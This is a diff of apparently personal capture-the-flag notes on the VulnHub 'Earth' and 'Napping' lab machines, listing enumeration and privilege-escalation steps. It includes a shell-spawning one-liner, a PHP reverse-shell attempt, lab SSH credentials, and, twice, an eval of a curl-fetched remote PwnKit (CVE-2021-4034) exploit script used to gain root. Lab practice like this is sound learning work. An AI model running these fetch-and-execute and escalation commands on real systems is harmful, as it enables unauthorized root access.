@@ -244,11 +244,25 @@ Jangow Vuln Hub
 
 Earth
 
-https://medium.com/@lukegearty/vulnhub-earth-walkthrough-a803e2623bb2
-found user flag through CLI command "locate 'flag'"
-cat /var/earth_web/user_flag.txt "[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]"
-try to get root_user
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-loaded linpeas.sh found CVE-2021-4034 in reporte
-try to apply this exploit trough 'eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"'
-got root_user and root _flag [root_flag_b0da9554d29db2117b02aa8b66ec492e]
+1. https://medium.com/@lukegearty/vulnhub-earth-walkthrough-a803e2623bb2
+2. found user flag through CLI command "locate 'flag'"
+3. cat /var/earth_web/user_flag.txt "[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]"
+4. try to get root_user
+5. python3 -c 'import pty; pty.spawn("/bin/bash")'
+6. loaded linpeas.sh found CVE-2021-4034 in reporte
+7. try to apply this exploit trough 'eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"'
+8. got root_user and root _flag [root_flag_b0da9554d29db2117b02aa8b66ec492e]
+
+========================================================================================
+
+Napping vulnhub 
+1. Scan ports found 22 and 80
+2. Scan directories, nothing
+3. Have login form 
+4. Try regisrtreted and found Blog link, try use reverse shell
+5. http://10.0.2.15:8888/php-reverse-shell.php - nothing, but it was right direction
+6. found hint with walkthrough and creds 'diniel:C@ughtm3napping123' for ssh
+7. Try esclate to root_user
+8. found through linpeas_report vulnerability CVE-2021-4034
+9. eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
+10. got user and root flags
